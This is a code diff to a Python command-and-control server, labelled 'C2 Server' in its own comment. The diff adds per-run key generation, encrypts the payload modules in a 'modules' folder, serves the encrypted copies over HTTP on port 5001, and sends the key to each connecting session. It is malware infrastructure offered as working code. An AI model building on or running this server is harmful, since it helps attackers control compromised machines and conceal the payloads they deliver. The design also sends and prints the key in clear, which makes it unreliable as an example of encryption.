@@ -3,11 +3,9 @@
 
 import psutil
 import signal
-import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os, time
+import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os, time,secrets
 import random
-
-
-
+import encryption
 
 class server():
     def __init__(self, host='localhost', port = 5000, db='memory'):
@@ -18,6 +16,7 @@ class server():
         self.port = port
         self.db = db
         self.app = None
+        self.key = self.generate_key()
         self.threads = []
         #TODO: dockerfile
         #TODO: list all sessions
@@ -111,6 +110,9 @@ class server():
                         
                         self.sessions.append(new_session)
                         helpers.show("CREATED NEW SESSION WITH ID " + str(session_id), colour="BLUE", style="BRIGHT", end="\n->")
+
+                        connection.sendall(self.key)
+                        print(self.key)
                     else:
                         helpers.show("CONNECTION FAILED", colour="RED", style="BRIGHT", end="\n->")
             except socket.timeout:
@@ -188,6 +190,8 @@ class server():
         globals()['close'] = True
         return
 
+    def generate_key(self):
+        return secrets.token_bytes(32)
 
     def run(self):
         #listen for incoming connections
@@ -216,14 +220,30 @@ class server():
           
 if __name__ == "__main__":       
 
+    #Initialize C2 Server
+    globals()['CommandServer'] = server()
+
+    modules_dir = os.path.join(os.getcwd(), 'modules')
+    encrypted_dir = os.path.join(os.getcwd(), 'encrypted')
+    
+    for filename in os.listdir(modules_dir):
+        if filename.endswith(".py"):
+            
+            with open(os.path.join(modules_dir, filename), "rb") as f:
+                plaintext = f.read()
+                ciphertext = encryption.encrypt(plaintext, globals()['CommandServer'].key)
+                output_filepath = os.path.join(encrypted_dir, filename)
+                with open(output_filepath, "wb") as f_out:
+                        f_out.write(ciphertext)
+                print(f"Encrypted: {filename}")
 
 
     #host the module files
     helpers.show("STARTING MODULE SERVER", colour='BLUE', style='BRIGHT', end='')
-    globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/modules',shell=True)
+    globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
     globals()['close'] = False
+
     helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='')
-    globals()['CommandServer'] = server()
     globals()['CommandServer'].run()
 
 
